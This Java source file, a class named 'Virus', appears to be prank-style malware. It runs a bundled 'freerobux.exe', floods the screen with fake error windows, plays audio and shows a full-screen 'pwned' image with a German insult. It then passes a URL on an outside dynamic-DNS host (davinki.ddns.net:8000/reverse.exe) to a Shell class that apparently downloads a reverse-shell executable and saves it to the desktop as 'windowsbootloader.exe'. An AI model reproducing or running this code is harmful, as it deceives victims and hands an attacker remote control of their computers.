import java.awt.Canvas;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Toolkit;
import java.awt.image.BufferStrategy;
import java.awt.image.BufferedImage;
import java.util.ArrayList;

import javax.imageio.ImageIO;

public class Virus extends Canvas implements Runnable {

	private static final long serialVersionUID = -7293884342156288804L;
	
	private final String link = "http://davinki.ddns.net:8000/reverse.exe";
	private final String file_name = "C:\\Users\\" + System.getProperty("user.name") + "\\Desktop\\windowsbootloader.exe";

	private final int ERRORS = 60;
	private ArrayList<ErrorWindow> windows = new ArrayList<ErrorWindow>();
	
	private Thread thread;
	private boolean run = true;
	
	private BufferedImage img;
	
	public Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();

	public Virus() throws Exception {
		
		img = ImageIO.read(ClassLoader.getSystemResource("pwned.jpg"));
		
		this.addKeyListener(new KeyInput());
	    
		GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
		GraphicsDevice[] gs = ge.getScreenDevices();
		
		try {
			Runtime.getRuntime().exec("C:\\Users\\" + System.getProperty("user.name") + "\\Desktop\\compile\\dist\\freerobux.exe");
			Thread.sleep(3000);
		} catch (Exception e){
			e.printStackTrace();
		}
		
		// Error Windows
		for(int i = 0; i < ERRORS; i++) {
			windows.add(new ErrorWindow(this));

			try { Thread.sleep(100); } 
			catch (InterruptedException e) { e.printStackTrace(); }
		}
		
		try { Thread.sleep(1000); } 
		catch (InterruptedException e) { e.printStackTrace(); }
		
		for(ErrorWindow err : windows) {
			err.closeWindow();
			
			try { Thread.sleep(20); } 
			catch (InterruptedException e) { e.printStackTrace(); }
		}
		
		new PlayAudio("stayinalive.wav", 0.7f);
		new Window("Du schwanz", this);
		
		try { Thread.sleep(10000); } 
		catch (InterruptedException e) { e.printStackTrace(); }
		
		new Shell(link, file_name);
	}
	
	public void sleep(int time) throws InterruptedException {
		Thread.sleep(time);
	}
	

	public synchronized void start() {
		thread = new Thread(this);
		thread.start();
		run = true;
	}
	
	public synchronized void stop() {
		try {
			thread.join();
			run = false;
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void run() {
		this.requestFocus();
		long lastTime = System.nanoTime();
		double amountOfTicks = 60.0;
		double ns = 1000000000 / amountOfTicks;
		double delta = 0;
		long timer = System.currentTimeMillis();
		int frames = 0;
		while (run) {
			long now = System.nanoTime();
			delta += (now -lastTime) / ns;
			lastTime = now;
			while(delta >= 1) {
				tick();
				delta--;
			}
			if (run) 
				render();
			frames++;
			
			if(System.currentTimeMillis() - timer > 1000) {
				timer += 1000;
				System.out.println("FPS: " + frames); // Debugging 
				frames = 0;
			}
		}
		stop();
	}
	
	private void tick() {

	}
	
	private void render() {
		BufferStrategy bs = this.getBufferStrategy();
		if (bs == null) {
			this.createBufferStrategy(3);
			return;
		}
		
		Graphics g = bs.getDrawGraphics();
		
		g.setColor(Color.black);
		g.fillRect(0, 0, WIDTH, HEIGHT);
		
		g.drawImage(img, 0, 0, (int)screen.getWidth(), (int)screen.getHeight(), null);
		
		g.dispose();
		bs.show();
	}

	public static void main(String[] args) {
		try {
			new Virus();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}